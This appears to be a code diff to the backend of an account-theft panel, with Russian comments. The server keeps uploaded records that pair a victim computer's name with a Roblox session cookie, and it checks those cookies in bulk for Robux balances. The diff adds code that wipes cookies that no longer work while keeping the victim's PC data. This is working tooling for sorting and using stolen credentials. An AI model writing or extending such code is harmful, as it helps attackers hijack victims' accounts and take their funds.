@@ -744,6 +744,26 @@ async function fetchRobuxInfo(robloSecurity) {
   }
 }
 
+// Удаление невалидного токена из записи (очищает roblox.security, оставляя данные ПК)
+async function removeInvalidToken(db, user, filename) {
+  try {
+    if (db) {
+      await db.collection('files').updateOne(
+        { name: filename, operator: user },
+        { $set: { 'roblox.security': '' }, $unset: { 'robuxInfo': '' } }
+      );
+    } else {
+      const doc = (global.memFiles || []).find(f => f.name === filename && f.operator === user);
+      if (doc) {
+        doc.roblox.security = '';
+        delete doc.robuxInfo;
+      }
+    }
+  } catch (e) {
+    console.error('removeInvalidToken error:', e.message);
+  }
+}
+
 // POST /robux-check — проверка токена и баланса
 app.post('/robux-check', requireAuth, async (req, res) => {
   const { robloSecurity } = req.body;
@@ -770,8 +790,13 @@ app.post('/robux-bulk', requireAuth, async (req, res) => {
     try {
       const info = await fetchRobuxInfo(roblox.security);
       results.push({ file: doc.name, originalName: doc.originalName, computer: doc.computer?.name || 'Unknown', user: roblox.user, ...info });
+      if (!info.valid) {
+        await removeInvalidToken(db, user, doc.name);
+        console.log(`[${new Date().toLocaleTimeString()}] 🗑 Невалидный токен удалён: ${doc.name}`);
+      }
     } catch (e) {
       results.push({ file: doc.name, user: roblox.user, valid: false, error: e.message });
+      await removeInvalidToken(db, user, doc.name);
     }
   }
   res.json(results);
@@ -794,8 +819,13 @@ app.post('/robux-check-file', requireAuth, async (req, res) => {
     if (!roblox.security) return res.json({ valid: false, error: 'Токен не сохранён' });
     try {
       const rbInfo = await fetchRobuxInfo(roblox.security);
+      if (!rbInfo.valid) {
+        await removeInvalidToken(db, user, filename);
+        console.log(`[${new Date().toLocaleTimeString()}] 🗑 Невалидный токен удалён: ${filename}`);
+      }
       res.json(rbInfo);
     } catch (e) {
+      await removeInvalidToken(db, user, filename);
       res.json({ valid: false, error: e.message });
     }
   } catch (e) {
@@ -829,8 +859,13 @@ app.get('/tokens-data', requireAuth, async (req, res) => {
           computer: doc.computer?.name || 'Unknown', uploadedAt: doc.uploadedAt,
           user: roblox.user, security: roblox.security, ...info
         });
+        if (!info.valid) {
+          await removeInvalidToken(db, user, doc.name);
+          console.log(`[${new Date().toLocaleTimeString()}] 🗑 Невалидный токен удалён: ${doc.name}`);
+        }
       } catch (e) {
         results.push({ file: doc.name, user: roblox.user, valid: false, error: e.message, security: roblox.security });
+        await removeInvalidToken(db, user, doc.name);
       }
     }
 
